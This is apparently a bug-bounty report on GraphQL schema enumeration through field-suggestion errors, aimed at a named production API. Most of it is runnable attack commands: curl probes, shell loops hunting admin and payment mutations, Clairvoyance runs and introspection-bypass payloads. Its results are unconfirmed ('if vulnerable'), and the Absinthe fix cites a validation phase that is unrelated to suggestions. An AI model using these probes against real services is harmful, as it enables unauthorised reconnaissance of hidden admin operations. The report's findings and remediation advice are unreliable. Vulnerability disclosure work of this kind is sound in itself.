# HackerOne Submission — GraphQL Schema Enumeration via Field Suggestions (Introspection Disabled Bypass)

**Program:** Whatnot  
**Weakness:** Information Disclosure  
**Severity:** Medium  
**Asset:** api.whatnot.com  

---

## Summary

Even when GraphQL introspection is disabled, Apollo Server and Absinthe return "Did you mean X?" suggestions in error messages when an invalid field name is queried. By systematically sending invalid field names and harvesting the suggestions, an attacker can reconstruct Whatnot's complete GraphQL schema — including hidden mutations, admin fields, and internal types — without needing introspection access. This technique (implemented by the tool "Clairvoyance") defeats the most common defence against schema enumeration.

---

## Steps to Reproduce

### Step 1 — Confirm introspection is disabled but suggestions are enabled

```bash
# First confirm introspection is off
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}' 

# Expected safe response:
# {"errors":[{"message":"GraphQL introspection is not allowed"}]}

# Now test for field suggestions - query a bad field name
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ usr { id } }"}'
```

**Vulnerable response (field suggestion leaks valid field name):**
```json
{
  "errors": [{
    "message": "Cannot query field \"usr\" on type \"RootQueryType\". Did you mean \"user\" or \"users\"?"
  }]
}
```

---

### Step 2 — Enumerate root query fields manually

```bash
# Try common field name fragments to harvest suggestions
for field in usr ord prod liv bid pay not msg sett adm int; do
  echo "=== Testing: $field ==="
  curl -s -X POST https://api.whatnot.com/seller-api/graphql \
    -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"{ ${field} { id } }\"}" | python3 -m json.tool
  echo ""
done
```

---

### Step 3 — Automate full schema enumeration with Clairvoyance

Install and run the Clairvoyance tool against Whatnot's GraphQL endpoint:

```bash
pip install clairvoyance

# Basic enumeration
clairvoyance \
  -u "https://api.whatnot.com/seller-api/graphql" \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "X-Whatnot-App: whatnot-web" \
  -o whatnot_schema.json

# The tool will:
# 1. Send queries with garbage field names to trigger suggestions
# 2. Harvest suggestions to learn valid field names
# 3. Recursively enumerate nested types
# 4. Reconstruct the full schema as JSON
```

---

### Step 4 — Target hidden/admin mutations specifically

Once root fields are known, enumerate mutations for sensitive operations:

```bash
# Try admin-sounding mutation fragments
for mut in ban sus ref cred adm fee com pay wai; do
  echo "=== Mutation fragment: $mut ==="
  curl -s -X POST https://api.whatnot.com/seller-api/graphql \
    -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"mutation { ${mut}User { success } }\"}" \
    | grep -o '"message":"[^"]*"'
done
```

Look for suggestions like:
- `"Did you mean banUser, suspendUser, or banSeller?"`
- `"Did you mean refundOrder or refundBuyer?"`
- `"Did you mean creditWallet or addCredit?"`
- `"Did you mean adminOverride or adminSetCommission?"`

---

### Step 5 — Test alternate introspection bypass payloads

Some implementations block basic `__schema` but not alternate forms:

```bash
# Newline injection
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{\n__schema\n{\ntypes\n{\nname\n}\n}\n}"}'

# Fragment-based
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "fragment f on __Schema { types { name } } { ...f }"}'

# Alias-based
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ s: __schema { types { name } } }"}'
```

---

## Expected Result

Field queries for invalid names should return a generic error without revealing valid alternatives:
```json
{"errors": [{"message": "Unknown field."}]}
```

## Actual Result (if vulnerable)

Error messages include "Did you mean X?" revealing valid field names, enabling full schema reconstruction without introspection.

---

## Impact

- Complete schema reconstruction despite introspection being disabled
- Reveals all hidden mutations (admin operations, payment overrides, account management)
- Enables finding the IDOR and mass assignment vulnerabilities in subsequent requests
- Significantly reduces attacker time-to-exploit for all other GraphQL vulnerabilities
- Defeats the primary mitigation most teams apply when disabling introspection

---

## Recommended Fix

- Disable field suggestions in production: In Absinthe, use `Absinthe.Phase.Document.Validation.ProvidedNonNullArguments` and strip suggestion text from errors
- In Apollo, set `fieldSuggestions: false` in server config
- Return generic error messages: `"Unknown field on type Query"` with no suggestions
- Reference: [Apollo field suggestions config](https://www.apollographql.com/docs/apollo-server/workflow/requests/)
